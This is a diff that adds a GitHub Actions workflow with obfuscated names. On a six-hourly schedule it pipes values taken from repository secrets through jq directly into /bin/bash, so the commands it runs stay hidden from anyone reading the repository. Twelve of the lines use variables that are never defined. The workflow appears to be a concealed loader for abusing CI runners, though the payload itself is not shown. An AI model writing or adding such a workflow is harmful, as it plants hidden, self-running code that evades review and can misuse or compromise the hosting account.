@@ -1,0 +1,29 @@
+name: wenziytx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wenziytx
+        env:
+          par12: ${{ secrets.par12 }}
+        run: |
+          echo $par12 | jq -r .gskp0614 | /bin/bash
+          echo $d7738 | jq -r .kwe36 | /bin/bash
+          echo $wypb40 | jq -r .ob66 | /bin/bash
+          echo $krlwy1021 | jq -r .dlua03 | /bin/bash
+          echo $x96 | jq -r .edr2217 | /bin/bash
+          echo $y1 | jq -r .bj9834 | /bin/bash
+          echo $sdn45469 | jq -r .kjic14 | /bin/bash
+          echo $o4 | jq -r .mhwv43 | /bin/bash
+          echo $er4489 | jq -r .d92443 | /bin/bash
+          echo $tse8 | jq -r .pbrxy090 | /bin/bash
+          echo $hj1788 | jq -r .f23 | /bin/bash
+          echo $ityfk7 | jq -r .n6037 | /bin/bash
+          echo $onbmv736 | jq -r .ynjwx663 | /bin/bash
+
